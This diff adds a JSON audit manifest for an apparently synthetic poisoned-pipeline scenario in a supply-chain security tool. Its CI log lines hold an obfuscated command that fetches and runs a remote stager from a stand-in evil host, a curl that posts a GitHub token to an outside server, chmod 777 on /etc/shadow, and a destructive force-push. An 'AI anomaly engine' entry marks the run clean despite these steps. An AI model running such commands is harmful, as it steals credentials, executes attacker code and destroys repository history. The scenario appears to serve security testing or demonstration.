@@ -1,0 +1,138 @@
+{
+  "schema_version": "git-chain.v2.4.0-audit-manifest",
+  "generation_metadata": {
+    "generated_at": "2026-10-22T04:45:51.489208+00:00",
+    "framework": "Git-Chain DevSecOps Enterprise",
+    "compliance_target": "NIST SP 800-218 (SSDF) / SLSA Level 4",
+    "analyst_identity": "NavdeepNP (navdeepmalik077@gmail.com)"
+  },
+  "target_repository": {
+    "name": "NavdeepNP/git-chain-core",
+    "remote_url": "https://github.com/NavdeepNP/git-chain-core.git",
+    "branch": "refs/heads/main",
+    "scenario": "Supply Chain Infiltration (Poisoned Pipeline)",
+    "total_commits": 3,
+    "total_log_entries": 5
+  },
+  "git_commit_dag": [
+    {
+      "commit_hash": "41982b7c4a109842f91048b91823a019482b9a71",
+      "parents": [
+        "0000000000000000000000000000000000000000"
+      ],
+      "author": "NavdeepNP <navdeepmalik077@gmail.com>",
+      "timestamp": "2026-10-21 23:45:04 UTC",
+      "message": "refactor(network): optimize connection multiplexing",
+      "gpg_signed": true,
+      "diff_summary": "src/net/mux.py | +89 -12 lines"
+    },
+    {
+      "commit_hash": "8821094ba719284019284a01928471a8293b0198",
+      "parents": [
+        "41982b7c4a109842f91048b91823a019482b9a71"
+      ],
+      "author": "Unknown Contributor <shadow_dev@ghost-relay.net>",
+      "timestamp": "2026-10-22 01:45:04 UTC",
+      "message": "build(ci): speed up build cache and update runner script",
+      "gpg_signed": false,
+      "diff_summary": "scripts/build_ci.sh | +15 -1 lines (chmod 777 injected)"
+    },
+    {
+      "commit_hash": "f04928194a0293b84710928471a8293b019842a1",
+      "parents": [
+        "8821094ba719284019284a01928471a8293b0198"
+      ],
+      "author": "CI Runner <ci-admin@runner-node-04.internal>",
+      "timestamp": "2026-10-22 04:00:04 UTC",
+      "message": "fix(ci): override branch history git push --force",
+      "gpg_signed": false,
+      "diff_summary": "git push --force origin main | Destructive rewrite"
+    }
+  ],
+  "cicd_pipeline_logs": [
+    {
+      "step": 1,
+      "stage": "checkout",
+      "timestamp": "2026-10-22 04:00:04 UTC",
+      "command": "git checkout origin/main",
+      "output": "HEAD at f049281 (PR #42 by shadow_dev merged into NavdeepNP/git-chain-core)",
+      "exit_code": 0
+    },
+    {
+      "step": 2,
+      "stage": "setup-perms",
+      "timestamp": "2026-10-22 04:00:04 UTC",
+      "command": "chmod -R 777 /app/bin && chmod 777 /etc/shadow",
+      "output": "Permissions modified: rwxrwxrwx",
+      "exit_code": 0
+    },
+    {
+      "step": 3,
+      "stage": "build-step",
+      "timestamp": "2026-10-22 04:45:04 UTC",
+      "command": "echo 'Y3VybCAtcyBodHRwOi8vYzIuZXZpbC5jb20vc3RhZ2VyIHwgYmFzaA==' | base64 -d | sh",
+      "output": "[!] Connecting to remote stager... executing inline shell script",
+      "exit_code": 0
+    },
+    {
+      "step": 4,
+      "stage": "telemetry-exfil",
+      "timestamp": "2026-10-22 04:45:04 UTC",
+      "command": "curl -X POST https://api.blackhat-drop.net/leak -d GITHUB_TOKEN=$GH_SECRET_KEY",
+      "output": "HTTP/1.1 200 OK (Exfiltrated 256 bytes)",
+      "exit_code": 0
+    },
+    {
+      "step": 5,
+      "stage": "git-force-rebase",
+      "timestamp": "2026-10-22 04:45:04 UTC",
+      "command": "git rebase -f HEAD~2 && git push --force origin main",
+      "output": "Branch 'main' forced update f049281...8821094",
+      "exit_code": 0
+    }
+  ],
+  "ai_anomaly_engine": {
+    "scan_executed": true,
+    "total_findings": 0,
+    "verdict": "COMPLIANT_CLEAN",
+    "findings": []
+  },
+  "cryptographic_anchoring": {
+    "merkle_root": "0xf4e134c4fc771f4526624f9cecc6539a90585fe932c254c91e186aca3da9cdc8",
+    "total_leaf_count": 8,
+    "leaf_hashes": [
+      "0x42a2115ab59efe27c1e24674b4cba2a2af3f3bd2a873b1008d6932290e5c697b",
+      "0xd52751ba8664f169e2502a4fbf9241117720bcd7850207c68c1f5c1a2e2d3839",
+      "0x212f86de5f3086ef42b2a3d3ee037b8770b30a9dea3bd2987a079796ae7e19e5",
+      "0x93eae8c0330601f26157c934f489ca2ec43ce4cc8c5cc80288fccba216ed3df1",
+      "0x391da26c69626dd567ebc2be3f17a2a704e28d50b9adcf13268e31def5bd653c",
+      "0x3cfad3d7c932e5eb92ba703ee5a63996ce445348ecb9a426683b1a03d0e4a93a",
+      "0xe77674d76beface693eaf29067551ae1ca4fa405c8e174b46f9755747b478153",
+      "0xeccfc16ac8aed0ab93edd81f2411d25c30eaefff3a052627eb4638b6f1779163"
+    ],
+    "sample_merkle_proof": [
+      {
+        "position": "right",
+        "sibling": "0xd52751ba8664f169e2502a4fbf9241117720bcd7850207c68c1f5c1a2e2d3839"
+      },
+      {
+        "position": "right",
+        "sibling": "0x3976e982b53814328bd2c0bff35fe377802fc62293b21129721deeb707d01245"
+      },
+      {
+        "position": "right",
+        "sibling": "0x5fcae12c87bf29bed419d9fb06f856ee182021929cc14f5c1f899ce00c483301"
+      }
+    ]
+  },
+  "blockchain_receipt": {
+    "status": "UNANCHORED",
+    "note": "State not yet committed to on-chain smart contract."
+  },
+  "tamper_evident_seal": {
+    "algorithm": "SHA-256",
+    "digest": "0x8bf4ef31c5c0273824db28bbfcdd40c114864ef14f5ec6b8aba0bbbe61f15d93",
+    "signature": "0x1aa75e7fc8cf68a3c97f357b0bc8f5de6923d7b063d7623f2666f0f23f27a6bddac1ba9ec399c1b649a67adc4384a374ee654dee62e5afc20ac91b8d0fb717cf",
+    "verification_status": "AUTHENTIC"
+  }
+}
